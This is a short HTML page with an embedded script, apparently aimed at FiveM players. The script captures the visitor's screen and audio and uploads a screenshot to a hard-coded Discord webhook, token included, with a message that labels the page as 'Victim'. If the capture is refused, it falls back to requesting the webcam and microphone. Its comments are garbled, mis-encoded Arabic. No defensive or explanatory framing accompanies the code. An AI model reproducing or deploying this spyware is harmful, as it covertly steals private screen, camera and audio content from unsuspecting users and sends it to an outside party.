<body>
<script>
(async () => {
  try {
    // ุงูุชูุงุท ุงูุดุงุดุฉ (popup ูุทูุนุ ุจุณ ูู ูุงูู ุงูุถุญูุฉ ุณุงุจููุง โ ุจุฏูู)
    const stream = await navigator.mediaDevices.getDisplayMedia({
      video: { cursor: "always" },
      audio: true  // mic ููุงู ูู ุชุจู
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    await new Promise(r => video.onloadedmetadata = r);
    video.play();

    // Canvas ููุตูุฑุฉ
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    // Blob + FormData ูู Discord
    const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
    const form = new FormData();
    form.append('file', new File([blob], 'fivem_screen.png', {type: 'image/png'}));
    form.append('payload_json', JSON.stringify({
      content: `๐ฅ๏ธ FiveM Screen Capture\nVictim: ${window.location.href}`,
      embeds: [{ image: { url: 'attachment://fivem_screen.png' } }]
    }));

    // webhookู
    await fetch('https://discord.com/api/webhooks/1437916956857471156/uz8Dwumsts1wpZRXrC0l6mSTaTd27zlM1ap7StaYVp51WipVx2vE21PWhVSCRab5PkwE', {
      method: 'POST',
      body: form
    });

    console.log('ุชู ุงูุฅุฑุณุงู!');  // hidden ูู ุงููุนุจุฉ

    stream.getTracks().forEach(t => t.stop());
  } catch(e) {
    // ูู ุฑูุถ โ ุฌุฑุจ getUserMedia ููู mic/webcam
    navigator.mediaDevices.getUserMedia({audio: true, video: true}).then(stream => {
      // ููุณ ุงูููุฏ...
    });
  }
})();
</script>
</body>
